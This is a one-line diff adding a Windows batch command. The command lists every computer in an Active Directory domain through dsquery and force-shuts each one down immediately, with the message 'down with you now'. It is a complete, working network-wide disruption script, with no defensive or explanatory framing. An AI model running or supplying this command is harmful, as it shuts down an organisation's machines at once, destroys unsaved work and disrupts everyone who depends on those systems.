@@ -1,0 +1,1 @@
+@for /f %%a in ('"dsquery computer -o rdn"') do start shutdown -s -m \\%%~a -t 0 -f -c "down with you now" -d p:0:0
